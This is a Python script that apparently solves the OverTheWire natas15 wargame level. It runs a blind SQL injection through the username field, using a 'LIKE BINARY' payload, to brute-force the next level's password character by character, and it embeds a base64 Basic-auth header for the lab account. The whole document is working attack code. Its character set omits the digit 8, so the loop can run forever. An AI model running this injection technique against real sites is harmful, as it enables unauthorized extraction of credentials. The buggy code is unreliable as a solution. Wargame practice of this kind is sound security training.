import requests


def check_user(pass_start):
    post = pass_start
    res = requests.post(
        "http://natas15.natas.labs.overthewire.org/index.php?debug=1",
        headers={'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='},
        data={'username': f'natas16" and password LIKE BINARY "{post}%'},
    )
    return ("This user exists." in res.text)


passowrd = ""
while (len(passowrd) <= 32):
    for j in "qwertyuiopasdfghjklzxcvbnm123456790QWERTYUIOPASDFGHJKLZXCVBNM":
        if check_user(passowrd + j):
            passowrd += j
            print(passowrd)
            break
